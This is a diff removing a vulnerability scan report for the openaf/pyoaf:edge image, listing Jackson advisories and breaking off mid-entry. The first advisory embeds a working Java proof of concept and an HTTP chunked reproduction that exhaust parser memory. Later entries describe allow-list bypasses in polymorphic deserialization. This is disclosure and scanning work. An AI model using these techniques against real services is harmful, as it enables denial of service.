@@ -1,1239 +1,1868 @@
 ```yaml
-╭ [0] ╭ Target  : openaf/pyoaf:edge (alpine 3.24.1) 
-│     ├ Class   : os-pkgs 
-│     ├ Type    : alpine 
-│     ╰ Packages 
-╰ [1] ╭ Target         : Java 
-      ├ Class          : lang-pkgs 
-      ├ Type           : jar 
-      ├ Packages        
-      ╰ Vulnerabilities ╭ [0]  ╭ VulnerabilityID : GHSA-r7wm-3cxj-wff9 
-                        │      ├ PkgName         : com.fasterxml.jackson.core:jackson-core 
-                        │      ├ PkgPath         : openaf/openaf.jar 
-                        │      ├ PkgIdentifier    ╭ PURL: pkg:maven/com.fasterxml.jackson.core/jackson-core@2.2
-                        │      │                  │       1.1 
-                        │      │                  ╰ UID : e7f3a221af06f63e 
-                        │      ├ InstalledVersion: 2.21.1 
-                        │      ├ FixedVersion    : 2.18.8, 2.21.4, 2.22.1 
-                        │      ├ Status          : fixed 
-                        │      ├ Layer            ╭ Digest: sha256:d36dd615f06f76c27493dc66f9cd73c3a8c6f9dffe96
-                        │      │                  │         e61bc9def262a812d835 
-                        │      │                  ╰ DiffID: sha256:365145d731c532306921c40bebb4a152b75072f93979
-                        │      │                            f1821571add51cc4d0ca 
-                        │      ├ SeveritySource  : ghsa 
-                        │      ├ PrimaryURL      : https://github.com/advisories/GHSA-r7wm-3cxj-wff9 
-                        │      ├ DataSource       ╭ ID  : ghsa 
-                        │      │                  ├ Name: GitHub Security Advisory Maven 
-                        │      │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+e
-                        │      │                          cosystem%3Amaven 
-                        │      ├ Fingerprint     : sha256:ecdb309e20253d05761fbd6f4bd256eeec6fc77a572c3f9ba0540
-                        │      │                   c39081662f4 
-                        │      ├ Title           : jackson-core: Async parser maxNumberLength bypass via
-                        │      │                   chunked digit accumulation (incomplete fix for
-                        │      │                   GHSA-72hv-8253-57qq) 
-                        │      ├ Description     : ## Summary
-                        │      │                   
-                        │      │                   The fix released in jackson-core `2.18.6` and `2.21.1` for
-                        │      │                   [GHSA-72hv-8253-57qq](https://github.com/FasterXML/jackson-c
-                        │      │                   ore/security/advisories/GHSA-72hv-8253-57qq) (Number Length
-                        │      │                   Constraint Bypass in Async Parser, published 2026-02-28) is
-                        │      │                   incomplete. The fix commit `b0c428e6` (#1555) wired
-                        │      │                   `validateIntegerLength` into a new `_setIntLength` helper
-                        │      │                   and called it at every place where the integer portion of a
-                        │      │                   number is *decided* (terminator byte arrived, `.` / `e/E`
-                        │      │                   seen, end-of-feed inside a fully-buffered value). It did not
-                        │      │                    call it on the much more attacker-relevant path: "ran out
-                        │      │                   of input while still inside `MINOR_NUMBER_INTEGER_DIGITS`,
-                        │      │                   return `NOT_AVAILABLE` to caller".
-                        │      │                   As a result, an attacker who streams JSON to a non-blocking
-                        │      │                   parser in many small chunks, without ever sending a
-                        │      │                   terminator byte, can keep the parser inside
-                        │      │                   `MINOR_NUMBER_INTEGER_DIGITS` indefinitely.
-                        │      │                   `_textBuffer.expandCurrentSegment()` grows on every chunk,
-                        │      │                   and `validateIntegerLength` is never invoked. The
-                        │      │                   accumulator is only gated by `maxStringLength` (20 MiB
-                        │      │                   default) — a **~20,000x amplification** of the documented
-                        │      │                   `maxNumberLength` (1000 default).
-                        │      │                   This is the same vulnerability class, same advisory wording
-                        │      │                   ("Memory Exhaustion: Unbounded allocation in TextBuffer from
-                        │      │                    excessively long numbers"), same parser class — just the
-                        │      │                   streaming path the original fix didn't cover. The fix to the
-                        │      │                    *fraction* path is correct (see `_finishFloatFraction` at
-                        │      │                   line 1834-1837 of `NonBlockingUtf8JsonParserBase.java` in
-                        │      │                   2.18.6, where `_setFractLength(fractLen)` IS called before
-                        │      │                   the `NOT_AVAILABLE` return); the equivalent call is missing
-                        │      │                   from every integer-digit path.
-                        │      │                   ## Affected versions
-                        │      │                   Verified on the patched releases:
-                        │      │                   - `com.fasterxml.jackson.core:jackson-core` **2.18.6**
-                        │      │                   - `com.fasterxml.jackson.core:jackson-core` **2.21.1**
-                        │      │                   Structurally identical code in `tools.jackson.core` 3.0.x /
-                        │      │                   3.1.x — same `NonBlockingUtf8JsonParserBase` class, same
-                        │      │                   `_setIntLength` rollout, same NOT_AVAILABLE returns without
-                        │      │                   validation. Not retested but presumed vulnerable.
-                        │      │                   ## Affected code
-                        │      │                   [`src/main/java/com/fasterxml/jackson/core/json/async/NonBlo
-                        │      │                   ckingUtf8JsonParserBase.java`](https://github.com/FasterXML/
-                        │      │                   jackson-core/blob/b0c428e6/src/main/java/com/fasterxml/jacks
-                        │      │                   on/core/json/async/NonBlockingUtf8JsonParserBase.java) in
-                        │      │                   2.18.6 / 2.21.1.
-                        │      │                   ### Site 1 — `_startPositiveNumber(int ch)` lines
-                        │      │                   1320-1330:
-                        │      │                   ```java
-                        │      │                   if (outPtr >= outBuf.length) {
-                        │      │                       // NOTE: must expand to ensure contents all in a single
-                        │      │                   buffer (to keep
-                        │      │                       // other parts of parsing simpler)
-                        │      │                       outBuf = _textBuffer.expandCurrentSegment();
-                        │      │                   }
-                        │      │                   outBuf[outPtr++] = (char) ch;
-                        │      │                   if (++_inputPtr >= _inputEnd) {
-                        │      │                       _minorState = MINOR_NUMBER_INTEGER_DIGITS;
-                        │      │                       _textBuffer.setCurrentLength(outPtr);
-                        │      │                       return _updateTokenToNA();          // <-- no
-                        │      │                   validateIntegerLength(outPtr)
-                        │      │                   ```
-                        │      │                   ### Site 2 — `_finishNumberIntegralPart` lines 1691-1727:
-                        │      │                   protected JsonToken _finishNumberIntegralPart(char[] outBuf,
-                        │      │                    int outPtr) throws IOException {
-                        │      │                       int negMod = _numberNegative ? -1 : 0;
-                        │      │                       while (true) {
-                        │      │                           if (_inputPtr >= _inputEnd) {
-                        │      │                               _minorState = MINOR_NUMBER_INTEGER_DIGITS;
-                        │      │                               _textBuffer.setCurrentLength(outPtr);
-                        │      │                               return _updateTokenToNA();    // <-- no
-                        │      │                   validateIntegerLength(outPtr + negMod)
-                        │      │                           }
-                        │      │                           int ch = getByteFromBuffer(_inputPtr) & 0xFF;
-                        │      │                           if (ch < INT_0) {
-                        │      │                               if (ch == INT_PERIOD) {
-                        │      │                                   _setIntLength(outPtr+negMod);   // <--
-                        │      │                   validated here
-                        │      │                                   ++_inputPtr;
-                        │      │                                   return _startFloat(outBuf, outPtr, ch);
-                        │      │                               }
-                        │      │                               break;
-                        │      │                           if (ch > INT_9) {
-                        │      │                               if ((ch | 0x20) == INT_e) {
-                        │      │                           ++_inputPtr;
-                        │      │                           if (outPtr >= outBuf.length) {
-                        │      │                               outBuf = _textBuffer.expandCurrentSegment();
-                        │      │                           outBuf[outPtr++] = (char) ch;
-                        │      │                       }
-                        │      │                       _setIntLength(outPtr+negMod);            // <--
-                        │      │                       return _valueComplete(JsonToken.VALUE_NUMBER_INT);
-                        │      │                   The pattern recurs at lines 1297, 1329, 1343, 1365, 1395,
-                        │      │                   1409, 1437, 1467, 1481, 1586, 1644, 1698 — every "ran out of
-                        │      │                    input mid-integer" exit returns to the caller without
-                        │      │                   validating the accumulator length.
-                        │      │                   ### Compare with the fraction path that is correct
-                        │      │                   `_finishFloatFraction` lines 1827-1838:
-                        │      │                   while (loop) {
-                        │      │                       if (ch >= INT_0 && ch <= INT_9) {
-                        │      │                           ++fractLen;
-                        │      │                               _setFractLength(fractLen);          // <--
-                        │      │                   VALIDATED
-                        │      │                               return JsonToken.NOT_AVAILABLE;
-                        │      │                           ch = getNextSignedByteFromBuffer();
-                        │      │                       ...
-                        │      │                   ## Impact
-                        │      │                   Reactive frameworks (Spring WebFlux / Reactor, Quarkus,
-                        │      │                   Helidon, Vert.x JSON, anything wrapping
-                        │      │                   `JsonFactory.createNonBlockingByteArrayParser()` or
-                        │      │                   `createNonBlockingByteBufferParser()`) feed inbound
-                        │      │                   HTTP/gRPC bytes to the async parser as they arrive.
-                        │      │                   Operators who set
-                        │      │                   `StreamReadConstraints.builder().maxNumberLength(N)` on the
-                        │      │                   assumption that this caps memory per number value are not
-                        │      │                   getting that guarantee in chunked-feed scenarios. The parser
-                        │      │                    silently accumulates digits up to `maxStringLength` (20 MiB
-                        │      │                    default) per concurrent connection. Multiply by
-                        │      │                   attacker-controlled concurrency to OOM the JVM.
-                        │      │                   The synchronous parsers (`UTF8StreamJsonParser`,
-                        │      │                   `ReaderBasedJsonParser`) and the async parser on *complete*
-                        │      │                   input are not affected — those paths go through
-                        │      │                   `_setIntLength` or `ParserBase._reportTooLongIntegral`
-                        │      │                   correctly.
-                        │      │                   CWE-770 (Allocation of Resources Without Limits or
-                        │      │                   Throttling), CVSS roughly the same as the parent advisory
-                        │      │                   (Network / Low complexity / High availability impact). The
-                        │      │                   parent advisory was scored CVSS 8.7 High.
-                        │      │                   ## Proof of concept
-                        │      │                   Standalone PoC, no Maven required:
-                        │      │                   mkdir poc && cd poc
-                        │      │                   curl -sLo jackson-core-2.18.6.jar
-                        │      │                   https://repo1.maven.org/maven2/com/fasterxml/jackson/core/ja
-                        │      │                   ckson-core/2.18.6/jackson-core-2.18.6.jar
-                        │      │                   cat > PoC.java <<'EOF'
-                        │      │                   import com.fasterxml.jackson.core.*;
-                        │      │                   import com.fasterxml.jackson.core.async.ByteArrayFeeder;
-                        │      │                   public class PoC {
-                        │      │                       public static void main(String[] args) throws Exception
-                        │      │                   {
-                        │      │                           StreamReadConstraints strict =
-                        │      │                   StreamReadConstraints.builder()
-                        │      │                                   .maxNumberLength(1000)
-                        │      │                                   .build();
-                        │      │                           JsonFactory f = new JsonFactoryBuilder()
-                        │      │                                   .streamReadConstraints(strict)
-                        │      │                           // Sanity: synchronous parser rejects 5000-digit
-                        │      │                   int.
-                        │      │                           try (JsonParser p = f.createParser("{\"v\":" +
-                        │      │                   "1".repeat(5000) + "}")) {
-                        │      │                               while (p.nextToken() != null) { /* drive */ }
-                        │      │                               System.out.println("[-] BUG ABSENT: sync parser
-                        │      │                   accepted");
-                        │      │                               return;
-                        │      │                           } catch (Exception e) {
-                        │      │                               System.out.println("[+] sync parser rejected
-                        │      │                   5000-digit int: " + e.getClass().getSimpleName());
-                        │      │                           // Bug: async parser, chunked, no terminator.
-                        │      │                           JsonParser ap =
-                        │      │                   f.createNonBlockingByteArrayParser();
-                        │      │                           ByteArrayFeeder feeder = (ByteArrayFeeder) ap;
-                        │      │                           byte[] preamble = "{\"v\":".getBytes("UTF-8");
-                        │      │                           feeder.feedInput(preamble, 0, preamble.length);
-                        │      │                           while (ap.nextToken() != JsonToken.NOT_AVAILABLE) {
-                        │      │                   /* drain */ }
-                        │      │                           byte[] digits = new byte[16 * 1024];
-                        │      │                           for (int i = 0; i < digits.length; i++) digits[i] =
-                        │      │                   (byte) ('1' + (i % 9));
-                        │      │                           for (int c = 0; c < 600; c++) {
-                        │      │                               feeder.feedInput(digits, 0, digits.length);
-                        │      │                               JsonToken t = ap.nextToken();
-                        │      │                               if (t != JsonToken.NOT_AVAILABLE) {
-                        │      │                                   System.out.println("[-] unexpected token: "
-                        │      │                   + t);
-                        │      │                                   return;
-                        │      │                           System.out.println("[+] BUG PRESENT: async parser
-                        │      │                   accepted ~9.83 MB of digits with maxNumberLength=1000");
-                        │      │                           // Closing the number now finally triggers the
-                        │      │                   validator.
-                        │      │                           feeder.feedInput("}".getBytes("UTF-8"), 0, 1);
-                        │      │                           feeder.endOfInput();
-                        │      │                           try {
-                        │      │                               while (ap.nextToken() != null) { /* drive */ }
-                        │      │                               System.out.println("[*] late rejection on close:
-                        │      │                    " + e.getMessage().split("\n")[0]);
-                        │      │                           ap.close();
-                        │      │                   EOF
-                        │      │                   javac -cp jackson-core-2.18.6.jar PoC.java
-                        │      │                   java -Xmx256m -cp jackson-core-2.18.6.jar:. PoC
-                        │      │                   Observed output against `jackson-core-2.18.6`:
-                        │      │                   [+] sync parser rejected 5000-digit int:
-                        │      │                   StreamConstraintsException
-                        │      │                   [+] BUG PRESENT: async parser accepted ~9.83 MB of digits
-                        │      │                   with maxNumberLength=1000
-                        │      │                   [*] late rejection on close: Number value length (9830400)
-                        │      │                   exceeds the maximum allowed (1000, from
-                        │      │                   `StreamReadConstraints.getMaxNumberLength()`)
-                        │      │                   Observed output against `jackson-core-2.21.1`: identical.
-                        │      │                   The 9.83 MB figure is purely a function of the loop bound
-                        │      │                   (600 chunks * 16 KiB). The actual ceiling is
-                        │      │                   `maxStringLength = 20 MiB`. With the strict policy declared
-                        │      │                   as `maxNumberLength = 1000`, the parser permits **9830x**
-                        │      │                   more allocation than the policy allows. With
-                        │      │                   `maxStringLength` left at the default 20 MiB, an attacker
-                        │      │                   can drive a single connection to 40 MiB of `char[]` heap
-                        │      │                   (chars are 2 bytes each) before the validator finally fires
-                        │      │                   on terminator/`endOfInput()`. Multiply by concurrent
-                        │      │                   connections.
-                        │      │                   ## End-to-end reproduction through real HTTP
-                        │      │                   Supplements the standalone PoC with a running Spring Boot
-                        │      │                   WebFlux server,
-                        │      │                   driving the same bug through the actual reactor-netty +
-                        │      │                   Jackson2JsonDecoder
-                        │      │                   streaming-decode path that production reactive endpoints
-                        │      │                   use.
-                        │      │                   Setup:
-                        │      │                   - Spring Boot 3.3.5 starter-webflux (spring-webflux 6.1.14,
-                        │      │                   reactor-netty 1.1.23)
-                        │      │                   - jackson-databind 2.17.2, jackson-core overridden:
-                        │      │                     - VULN run:
-                        │      │                   `com.fasterxml.jackson.core:jackson-core:2.18.7` (latest
-                        │      │                   published)
-                        │      │                     - PATCHED run: `2.18.8-SNAPSHOT` built from the fix
-                        │      │                   branch
-                        │      │                   - JVM: OpenJDK 17.0.18
-                        │      │                   - Server `JsonFactory` configured with
-                        │      │                   `StreamReadConstraints.builder().maxNumberLength(1000).build
-                        │      │                   ()`
-                        │      │                   Endpoint under test exposes the `Flux<DataBuffer>` request
-                        │      │                   body directly to
-                        │      │                   `Jackson2JsonDecoder.decode(Flux, ResolvableType, ...)` so
-                        │      │                   the parser sees one
-                        │      │                   HTTP chunk per `feedInput` (the same pattern used for any
-                        │      │                   `@RequestBody Flux<...>` / streaming JSON decoder in
-                        │      │                   WebFlux). A raw-socket
-                        │      │                   HTTP/1.1 chunked client streams `{"v":1` then 250 chunks of
-                        │      │                   200 digit bytes
-                        │      │                   each (50,000 digits total) at 20ms intervals, then writes
-                        │      │                   the closing `}`.
-                        │      │                   VULN — jackson-core 2.18.7:
-                        │      │                   [VULN-SMALLCHUNK] streamed 50000 digits across 250 chunks;
-                        │      │                   server still accepting
-                        │      │                   [VULN-SMALLCHUNK] full POST sent (50000 digits). Response:
-                        │      │                   HTTP/1.1 200 OK
-                        │      │                   ERR after 6548ms
-                        │      │                   cause=com.fasterxml.jackson.core.exc.StreamConstraintsExcept
-                        │      │                   ion:
-                        │      │                          Number value length (50000) exceeds the maximum
-                        │      │                   allowed (1000, ...)
-                        │      │                   Server-side controller trace (250 DataBuffer arrivals
-                        │      │                   elided):
-                        │      │                   [ctrl] DataBuffer arrived size=6   ms=39       <- '{"v":1'
-                        │      │                   [ctrl] DataBuffer arrived size=200 ms=42
-                        │      │                   ...
-                        │      │                   [ctrl] DataBuffer arrived size=199 ms=5993
-                        │      │                   [ctrl] DataBuffer arrived size=1   ms=6518     <- closing
-                        │      │                   '}'
-                        │      │                   [ctrl] ERR after 6548ms ... Number value length (50000)
-                        │      │                   exceeds ...
-                        │      │                   Server held all 50,000 digit characters in `_textBuffer` for
-                        │      │                    6.5 seconds with
-                        │      │                   `maxNumberLength=1000` declared. The validator never fires
-                        │      │                   during streaming;
-                        │      │                   it only fires at value-completion when the closing `}`
-                        │      │                   arrives.
-                        │      │                   PATCHED — jackson-core 2.18.8-SNAPSHOT (fix branch):
-                        │      │                   [PATCHED-SMALLCHUNK] connection broke after 2801 digits at
-                        │      │                   chunk 14: [Errno 32] Broken pipe
-                        │      │                   [PATCHED-SMALLCHUNK] DONE: digits_sent=2801
-                        │      │                   status=connection-broke-mid-stream
-                        │      │                   Server-side controller trace:
-                        │      │                   [ctrl] DataBuffer arrived size=6   ms=129
-                        │      │                   [ctrl] DataBuffer arrived size=200 ms=142
-                        │      │                   [ctrl] DataBuffer arrived size=200 ms=145
-                        │      │                   [ctrl] DataBuffer arrived size=200 ms=146
-                        │      │                   [ctrl] DataBuffer arrived size=200 ms=147
-                        │      │                   [ctrl] ERR after 155ms ... Number value length (1001)
-                        │      │                   exceeds the maximum allowed (1000, ...)
-                        │      │                   Patched server raises `StreamConstraintsException` at 155ms
-                        │      │                   after only 5
-                        │      │                   DataBuffers, exactly when the accumulated digit count
-                        │      │                   crosses
-                        │      │                   `maxNumberLength=1000`. The connection is reset mid-stream
-                        │      │                   rather than the
-                        │      │                   parser silently consuming the rest of the attacker's
-                        │      │                   payload.
-                        │      │                   Side-by-side:
-                        │      │                   | Build | Chunks accepted before exception | Digits buffered
-                        │      │                    | Time to detection |
-                        │      │                   |---|---|---|---|
-                        │      │                   | jackson-core 2.18.7 | 250 (full payload) | 50,000 (50x the
-                        │      │                    configured limit) | 6,548ms — only at terminator |
-                        │      │                   | 2.18.8-SNAPSHOT (fix branch) | 5 | 1,001 | 155ms — moment
-                        │      │                   threshold crossed |
-                        │      │                   Note on the default `@RequestBody Mono<JsonNode>` path: that
-                        │      │                    path cannot
-                        │      │                   distinguish the two builds because Spring's `decodeToMono`
-                        │      │                   joins all
-                        │      │                   DataBuffers into one before parsing. The exploitable shape
-                        │      │                   is the
-                        │      │                   streaming-decode path (`Flux<JsonNode>` / `@RequestBody
-                        │      │                   Flux<...>` /
-                        │      │                   WebSocket / SSE / any direct
-                        │      │                   `decoder.decode(Flux<DataBuffer>, ...)` call),
-                        │      │                   which is also what `Jackson2Tokenizer` uses for any
-                        │      │                   streaming JSON
-                        │      │                   deserialization in WebFlux and Quarkus reactive REST.
-                        │      │                   ## Suggested fix
-                        │      │                   Mirror the pattern already used in `_finishFloatFraction`.
-                        │      │                   At every site that returns `_updateTokenToNA()` (or
-                        │      │                   `JsonToken.NOT_AVAILABLE`) with `_minorState =
-                        │      │                   MINOR_NUMBER_INTEGER_DIGITS`, call `_setIntLength(outPtr +
-                        │      │                   negMod)` first. Concretely, the diff to
-                        │      │                   `NonBlockingUtf8JsonParserBase.java` would be:
-                        │      │                   ```diff
-                        │      │                        protected JsonToken _finishNumberIntegralPart(char[]
-                        │      │                   outBuf, int outPtr) throws IOException {
-                        │      │                            int negMod = _numberNegative ? -1 : 0;
-                        │      │                            while (true) {
-                        │      │                                if (_inputPtr >= _inputEnd) {
-                        │      │                                    _minorState = MINOR_NUMBER_INTEGER_DIGITS;
-                        │      │                                    _textBuffer.setCurrentLength(outPtr);
-                        │      │                   +               
-                        │      │                   _streamReadConstraints.validateIntegerLength(outPtr +
-                        │      │                   negMod);
-                        │      │                                    return _updateTokenToNA();
-                        │      │                                }
-                        │      │                   Note: `_setIntLength` itself can't be used as-is because it
-                        │      │                   also assigns `_intLength`, and `_intLength` must not be set
-                        │      │                   until the integer is truly complete (subsequent fraction
-                        │      │                   handling reads `_intLength`). The minimal fix is to call
-                        │      │                   only the validator, as shown.
-                        │      │                   Apply the same one-line insertion before each `return
-                        │      │                   _updateTokenToNA();` that exits with `_minorState =
-                        │      │                   MINOR_NUMBER_INTEGER_DIGITS`. The sites are listed above (12
-                        │      │                    lines total).
-                        │      │                   Alternatively, a heavier refactor: also gate
-                        │      │                   `_textBuffer.expandCurrentSegment()` calls inside the
-                        │      │                   digit-accumulation loops on `outPtr < maxNumberLength` so
-                        │      │                   that the validator fires at the moment the buffer would be
-                        │      │                   enlarged past the limit, rather than waiting for the next
-                        │      │                   chunk boundary. Either approach is sufficient.
-                        │      │                   ## Credit
-                        │      │                   Reported by `tonghuaroot` (`tonghuaroot@gmail.com`). Variant
-                        │      │                    hunt against the Feb 2026 fix for GHSA-72hv-8253-57qq. 
-                        │      ├ Severity        : HIGH 
-                        │      ├ VendorSeverity   ─ ghsa: 3 
-                        │      ├ CVSS             ─ ghsa ╭ V40Vector: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI
-                        │      │                         │            :N/VA:H/SC:N/SI:N/SA:N 
-                        │      │                         ╰ V40Score : 8.7 
-                        │      ├ References       ╭ [0]: https://github.com/FasterXML/jackson-core 
-                        │      │                  ├ [1]: https://github.com/FasterXML/jackson-core/commit/050b4
-                        │      │                  │      29804dce2a7e08f0be1b0b4c3d040fdb9cd 
-                        │      │                  ├ [2]: https://github.com/FasterXML/jackson-core/commit/4cdd5
-                        │      │                  │      29749da396cc7edf6d4a2aad41d47902641 
-                        │      │                  ├ [3]: https://github.com/FasterXML/jackson-core/commit/c5941
-                        │      │                  │      e5aae7fd5aeac55d66933cfb82b9aabeef8 
-                        │      │                  ├ [4]: https://github.com/FasterXML/jackson-core/pull/1611 
-                        │      │                  ╰ [5]: https://github.com/FasterXML/jackson-core/security/adv
-                        │      │                         isories/GHSA-r7wm-3cxj-wff9 
-                        │      ├ PublishedDate   : 2026-07-21T21:58:53Z 
-                        │      ╰ LastModifiedDate: 2026-07-21T21:58:53Z 
-                        ├ [1]  ╭ VulnerabilityID : CVE-2026-54512 
-                        │      ├ VendorIDs        ─ [0]: GHSA-j3rv-43j4-c7qm 
-                        │      ├ PkgName         : com.fasterxml.jackson.core:jackson-databind 
-                        │      ├ PkgPath         : openaf/openaf.jar 
-                        │      ├ PkgIdentifier    ╭ PURL: pkg:maven/com.fasterxml.jackson.core/jackson-databind
-                        │      │                  │       @2.21.1 
-                        │      │                  ╰ UID : 6bd66f14c6cb3d57 
-                        │      ├ InstalledVersion: 2.21.1 
-                        │      ├ FixedVersion    : 2.18.8, 3.1.4, 2.21.4 
-                        │      ├ Status          : fixed 
-                        │      ├ Layer            ╭ Digest: sha256:d36dd615f06f76c27493dc66f9cd73c3a8c6f9dffe96
-                        │      │                  │         e61bc9def262a812d835 
-                        │      │                  ╰ DiffID: sha256:365145d731c532306921c40bebb4a152b75072f93979
-                        │      │                            f1821571add51cc4d0ca 
-                        │      ├ SeveritySource  : ghsa 
-                        │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-54512 
-                        │      ├ DataSource       ╭ ID  : ghsa 
-                        │      │                  ├ Name: GitHub Security Advisory Maven 
-                        │      │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+e
-                        │      │                          cosystem%3Amaven 
-                        │      ├ Fingerprint     : sha256:03a06468d69092a25c2cff73dcb56fb5c5bcee4d1720d9fa775f1
-                        │      │                   0365af0f6cb 
-                        │      ├ Title           : jackson-databind: jackson-databind: Arbitrary code execution
-                        │      │                    via PolymorphicTypeValidator bypass 
-                        │      ├ Description     : jackson-databind contains the general-purpose data-binding
-                        │      │                   functionality and tree-model for Jackson Data Processor.
-                        │      │                   From 2.10.0 until 2.18.8, 2.21.4, and 3.1.4,
-                        │      │                   jackson-databind's PolymorphicTypeValidator (PTV) is the
-                        │      │                   primary safety mechanism guarding polymorphic
-                        │      │                   deserialization. When polymorphic typing is enabled and a
-                        │      │                   type identifier contains generic parameters (i.e. the type
-                        │      │                   ID string contains <),
-                        │      │                   DatabindContext._resolveAndValidateGeneric() validates only
-                        │      │                   the raw container class name (the substring before <)
-                        │      │                   against the configured PTV. If the container type is
-                        │      │                   approved, the method parses the full canonical type string
-                        │      │                   via TypeFactory.constructFromCanonical() and returns the
-                        │      │                   fully parameterized type without ever validating the nested
-                        │      │                   type arguments against the PTV. The nested type arguments
-                        │      │                   are then resolved, instantiated, and populated as beans
-                        │      │                   during deserialization. An attacker who controls the type ID
-                        │      │                    can therefore place a denied class as a generic type
-                        │      │                   parameter of an allowed container — for example
-                        │      │                   java.util.ArrayList<com.evil.Gadget> when only
-                        │      │                   java.util.ArrayList is allow-listed. The container passes
-                        │      │                   the PTV check; com.evil.Gadget is loaded via
-                        │      │                   Class.forName(name, true, loader), instantiated, and its
-                        │      │                   properties are set from attacker-controlled JSON. This
-                        │      │                   completely bypasses an explicitly configured PTV allow-list.
-                        │      │                    This vulnerability is fixed in 2.18.8, 2.21.4, and 3.1.4.[
-                        │      │                   m 
-                        │      ├ Severity        : HIGH 
-                        │      ├ CweIDs           ╭ [0]: CWE-184 
-                        │      │                  ╰ [1]: CWE-502 
-                        │      ├ VendorSeverity   ╭ alma       : 3 
-                        │      │                  ├ amazon     : 3 
-                        │      │                  ├ ghsa       : 3 
-                        │      │                  ├ oracle-oval: 3 
-                        │      │                  ├ redhat     : 3 
-                        │      │                  ╰ rocky      : 3 
-                        │      ├ CVSS             ╭ ghsa   ╭ V3Vector: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H
-                        │      │                  │        │           /A:H 
-                        │      │                  │        ╰ V3Score : 8.1 
-                        │      │                  ╰ redhat ╭ V3Vector: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H
-                        │      │                           │           /A:H 
-                        │      │                           ╰ V3Score : 8.1 
-                        │      ├ References       ╭ [0] : https://access.redhat.com/errata/RHSA-2026:40895 
-                        │      │                  ├ [1] : https://access.redhat.com/security/cve/CVE-2026-54512 
-                        │      │                  ├ [2] : https://bugzilla.redhat.com/2492010 
-                        │      │                  ├ [3] : https://bugzilla.redhat.com/2492015 
-                        │      │                  ├ [4] : https://bugzilla.redhat.com/show_bug.cgi?id=2492010 
-                        │      │                  ├ [5] : https://bugzilla.redhat.com/show_bug.cgi?id=2492015 
-                        │      │                  ├ [6] : https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
-                        │      │                  │       26-54512 
-                        │      │                  ├ [7] : https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
-                        │      │                  │       26-54513 
-                        │      │                  ├ [8] : https://errata.almalinux.org/9/ALSA-2026-40895.html 
-                        │      │                  ├ [9] : https://errata.rockylinux.org/RLSA-2026:40895 
-                        │      │                  ├ [10]: https://github.com/FasterXML/jackson-databind 
-                        │      │                  ├ [11]: https://github.com/FasterXML/jackson-databind/commit/
-                        │      │                  │       434d6c511de7fdd9872f29157aafb6162d12d8d5 
-                        │      │                  ├ [12]: https://github.com/FasterXML/jackson-databind/issues/
-                        │      │                  │       5988 
-                        │      │                  ├ [13]: https://github.com/FasterXML/jackson-databind/securit
-                        │      │                  │       y/advisories/GHSA-j3rv-43j4-c7qm 
-                        │      │                  ├ [14]: https://linux.oracle.com/cve/CVE-2026-54512.html 
-                        │      │                  ├ [15]: https://linux.oracle.com/errata/ELSA-2026-43400.html 
-                        │      │                  ├ [16]: https://nvd.nist.gov/vuln/detail/CVE-2026-54512 
-                        │      │                  ╰ [17]: https://www.cve.org/CVERecord?id=CVE-2026-54512 
-                        │      ├ PublishedDate   : 2026-06-23T21:17:02.203Z 
-                        │      ╰ LastModifiedDate: 2026-06-27T21:01:36.47Z 
-                        ├ [2]  ╭ VulnerabilityID : CVE-2026-54513 
-                        │      ├ VendorIDs        ─ [0]: GHSA-rmj7-2vxq-3g9f 
-                        │      ├ PkgName         : com.fasterxml.jackson.core:jackson-databind 
-                        │      ├ PkgPath         : openaf/openaf.jar 
-                        │      ├ PkgIdentifier    ╭ PURL: pkg:maven/com.fasterxml.jackson.core/jackson-databind
-                        │      │                  │       @2.21.1 
-                        │      │                  ╰ UID : 6bd66f14c6cb3d57 
-                        │      ├ InstalledVersion: 2.21.1 
-                        │      ├ FixedVersion    : 2.18.8, 2.21.4, 3.1.4 
-                        │      ├ Status          : fixed 
-                        │      ├ Layer            ╭ Digest: sha256:d36dd615f06f76c27493dc66f9cd73c3a8c6f9dffe96
-                        │      │                  │         e61bc9def262a812d835 
-                        │      │                  ╰ DiffID: sha256:365145d731c532306921c40bebb4a152b75072f93979
-                        │      │                            f1821571add51cc4d0ca 
-                        │      ├ SeveritySource  : ghsa 
-                        │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-54513 
-                        │      ├ DataSource       ╭ ID  : ghsa 
-                        │      │                  ├ Name: GitHub Security Advisory Maven 
-                        │      │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+e
-                        │      │                          cosystem%3Amaven 
-                        │      ├ Fingerprint     : sha256:19e1cbb7d8e14f694d8c1e05f4897816a89bc217b504e11a48c60
-                        │      │                   eba9c3d5aac 
-                        │      ├ Title           : jackson-databind: Jackson-databind: Security bypass allows
-                        │      │                   arbitrary code execution 
-                        │      ├ Description     : jackson-databind contains the general-purpose data-binding
-                        │      │                   functionality and tree-model for Jackson Data Processor.
-                        │      │                   From 2.10.0 until 2.18.8, 2.21.4, and 3.1.4,
-                        │      │                   BasicPolymorphicTypeValidator.Builder.allowIfSubTypeIsArray(
-                        │      │                   ) allowlists any array type based only on clazz.isArray(),
-                        │      │                   without validating the array's component (element) type
-                        │      │                   against the configured allowlist. A PTV built with
-                        │      │                   allowIfSubTypeIsArray() plus an explicit concrete-type
-                        │      │                   allowlist therefore still permits EvilType[] even though
-                        │      │                   EvilType is not allowlisted. When Jackson deserializes the
-                        │      │                   elements and no per-element type IDs are present, it
-                        │      │                   instantiates the component type directly with no further PTV
-                        │      │                    check, bypassing the allowlist. This vulnerability is fixed
-                        │      │                    in 2.18.8, 2.21.4, and 3.1.4. 
-                        │      ├ Severity        : HIGH 
-                        │      ├ CweIDs           ─ [0]: CWE-184 
-                        │      ├ VendorSeverity   ╭ alma       : 3 
-                        │      │                  ├ amazon     : 3 
-                        │      │                  ├ ghsa       : 3 
-                        │      │                  ├ oracle-oval: 3 
-                        │      │                  ├ redhat     : 3 
-                        │      │                  ╰ rocky      : 3 
-                        │      ├ CVSS             ╭ ghsa   ╭ V3Vector: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H
-                        │      │                  │        │           /A:H 
-                        │      │                  │        ╰ V3Score : 8.1 
